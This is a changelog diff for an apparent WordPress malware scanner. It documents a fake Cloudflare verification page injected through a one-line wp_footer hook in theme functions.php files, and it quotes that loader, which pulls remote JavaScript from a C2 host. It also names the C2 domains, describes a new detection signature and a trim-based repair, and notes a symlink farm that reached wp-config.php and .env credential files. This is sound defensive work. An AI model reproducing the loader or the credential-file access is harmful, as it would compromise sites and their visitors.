@@ -256,6 +256,29 @@ WAF: next is the plan's own direct-deny rules (phase 2) from fleet logs.
   that only Serial audit logs exist, and that its "Rule not supported"
   errors "can simply be ignored". If an article cannot be fetched, stop
   and ask the owner to paste it.
+- **Release 0.24.23: the fake Cloudflare check loader** (2026-11-02).
+  expresswrap.ae (server1.superfast, user expressw) showed a fake
+  "Verify you are human / Performance & security by Cloudflare" page a
+  few seconds after load; the site is not on Cloudflare. Cause (found by the
+  owner's server assistant, evidence zip): one line appended to the active
+  theme's functions.php, `add_action('wp_footer', function () { echo
+  '<script>var s=document.createElement("script");s.src="https://<c2>/kbS0.js";
+  ...</script>'; }, 99);`, on six installs of four accounts (expressw
+  astra, signfact ohio, integrat drmariaphysio renew-medical and igrowseo
+  seoz, hajraqur mission-child, filampro mokko-child), waves 2026-10-09,
+  10-15, 10-28 (c2 karmazarbaza.com, franfrbar.com, frclau.com). The page
+  is built in the browser, so no text of it is on the server; xPGuard had
+  no rule for the loader. New: PHP.Injector.FooterScriptLoader (a
+  wp_footer/wp_head/login hook printing only a script that loads a
+  mixed-case randomly named .js from another domain's root; Crisp, Tag
+  Manager, named widgets and wp_enqueue_script stay clean), and the file
+  is put back without the loader's lines (trim, up to 90% because the
+  engine knows the lines; php -l and a rescan must pass) instead of the
+  theme's functions.php being taken away. All nine infected copies from the
+  evidence are caught. Fixtures: TestFleetFooterScriptLoader(Trimmed).
+  Open: LiteSpeed's server-level cache keeps serving the old page after a
+  clean-up until it is purged; the minahsp1 symlink farm had targeted
+  expressw's wp-config.php, .env and .accesshash (credentials to rotate).
 - **Release 0.24.22: false positives from the 10 servers still scanning**
   (2026-11-01). The owner asked for samples of the running scans (8,715
   findings collected read-only, nothing restored there: the owner restores
